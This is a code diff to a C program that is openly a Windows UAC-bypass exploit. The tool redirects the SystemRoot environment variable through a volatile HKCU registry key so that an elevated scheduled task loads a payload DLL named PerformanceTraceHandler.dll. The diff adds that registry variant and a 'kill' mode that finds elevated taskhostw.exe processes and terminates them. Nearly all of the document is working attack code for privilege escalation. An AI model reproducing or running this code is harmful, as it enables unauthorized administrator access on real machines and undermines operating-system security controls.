@@ -3,6 +3,7 @@
 #include <string.h>
 
 #include <windows.h>
+#include <tlhelp32.h>
 
 #define DLLPATH "\\System32"
 #define DLLNAME "\\PerformanceTraceHandler.dll"
@@ -12,6 +13,100 @@
 #define ENVREGVALUE "SystemRoot"
 
 #define WAITFORTASK 2500
+
+#define CreateEnvEntryFunction CreateEnvEntry2
+#define DeleteEnvEntryFunction DeleteEnvEntry2
+
+HANDLE GetProcessTokenByPID(DWORD pid)
+{
+	HANDLE process = NULL;
+	HANDLE token = NULL;
+	process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+	if (process)
+	{
+		OpenProcessToken(process, MAXIMUM_ALLOWED, &token);
+		CloseHandle(process);
+	}
+	return token;
+}
+
+BOOL IsElevated(DWORD pid)
+{
+	BOOL ret = FALSE;
+	DWORD retlen = 0;
+	DWORD elevated = 0;
+	HANDLE token = GetProcessTokenByPID(pid);
+	if (token)
+	{
+		retlen = sizeof(elevated);
+		if (GetTokenInformation(token, TokenElevation, &elevated, retlen, &retlen))
+		{
+			if (elevated)
+			{
+				ret = TRUE;
+			}
+		}
+		CloseHandle(token);
+	}
+	return ret;
+}
+
+typedef BOOL(*LPELEVATED_TASKHOST_CALLBACK)(DWORD pid, void* parameter);
+
+BOOL FindElevatedTaskHostProcesses(LPELEVATED_TASKHOST_CALLBACK callback, void* parameter)
+{
+	HANDLE process = NULL;
+	PROCESSENTRY32W pe32;
+	HANDLE snapshot = NULL;
+	BOOL ret = FALSE;
+
+	if (!callback)
+	{
+		return FALSE;
+	}
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot != INVALID_HANDLE_VALUE)
+	{
+		memset(&pe32, 0, sizeof(pe32));
+		pe32.dwSize = sizeof(pe32);
+		if (Process32FirstW(snapshot, &pe32))
+		{
+			do
+			{
+				if (!lstrcmpiW(L"taskhostw.exe", pe32.szExeFile))
+				{
+					if (IsElevated(pe32.th32ProcessID))
+					{
+						ret = callback(pe32.th32ProcessID, parameter);
+						if (!ret)
+						{
+							break;
+						}
+					}
+				}
+			} while (Process32NextW(snapshot, &pe32));
+		}
+		CloseHandle(snapshot);
+	}
+	return ret;
+}
+
+BOOL TerminateElevatedProcess(DWORD pid, void* parameter)
+{
+	HANDLE process = NULL;
+	printf("PID %u found!\n", (unsigned int)pid);
+	process = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+	if (process)
+	{
+		printf("PID %u opened!\n", (unsigned int)pid);
+		if (TerminateProcess(process, 0))
+		{
+			printf("PID %u terminated!\n", (unsigned int)pid);
+		}
+		CloseHandle(process);
+	}
+	return TRUE;
+}
 
 BOOL CopyPayloadDLL(char* dllfile, char* basepath)
 {
@@ -59,7 +154,7 @@ BOOL DeletePayloadDLL(char* basepath)
 	return TRUE;
 }
 
-BOOL CreateEnvEntryFunction(char* basepath)
+BOOL CreateEnvEntry(char* basepath)
 {
 	HKEY key = NULL;
 
@@ -77,7 +172,7 @@ BOOL CreateEnvEntryFunction(char* basepath)
 	return TRUE;
 }
 
-BOOL DeleteEnvEntryFunction()
+BOOL DeleteEnvEntry()
 {
 	HKEY key = NULL;
 
@@ -86,6 +181,38 @@ BOOL DeleteEnvEntryFunction()
 		return FALSE;
 	}
 	RegDeleteValueA(key, ENVREGVALUE);
+	RegCloseKey(key);
+
+	return TRUE;
+}
+
+BOOL CreateEnvEntry2(char* basepath)
+{
+	HKEY key = NULL;
+
+	if (RegCreateKeyExA(HKEY_CURRENT_USER, ENVREGKEY2, 0, NULL, REG_OPTION_VOLATILE, KEY_SET_VALUE, NULL, &key, NULL))
+	{
+		return FALSE;
+	}
+	if (RegSetValueExA(key, ENVREGVALUE, 0, REG_SZ, basepath, lstrlenA(basepath) + 1))
+	{
+		RegCloseKey(key);
+		return FALSE;
+	}
+	RegCloseKey(key);
+
+	return TRUE;
+}
+
+BOOL DeleteEnvEntry2()
+{
+	HKEY key = NULL;
+
+	if (RegOpenKeyExA(HKEY_CURRENT_USER, ENVREGKEY, 0, KEY_READ, &key))
+	{
+		return FALSE;
+	}
+	RegDeleteKeyA(key, "0");
 	RegCloseKey(key);
 
 	return TRUE;
@@ -135,7 +262,7 @@ BOOL PressShiftCtrlWinT()
 
 void print_help(char* executable)
 {
-	printf("Usage: %s [bypass|cleanup] [dll path]\n", executable);
+	printf("Usage: %s [bypass|cleanup|kill] [dll path]\n", executable);
 }
 
 int main(int argc, char** argv)
@@ -155,6 +282,11 @@ int main(int argc, char** argv)
 	if (!lstrcmpiA(argv[1], "cleanup"))
 	{
 		Cleanup(tmppath);
+		return 0;
+	}
+	if (!lstrcmpiA(argv[1], "kill"))
+	{
+		FindElevatedTaskHostProcesses((LPELEVATED_TASKHOST_CALLBACK)TerminateElevatedProcess, NULL);
 		return 0;
 	}
 	if (lstrcmpiA(argv[1], "bypass"))
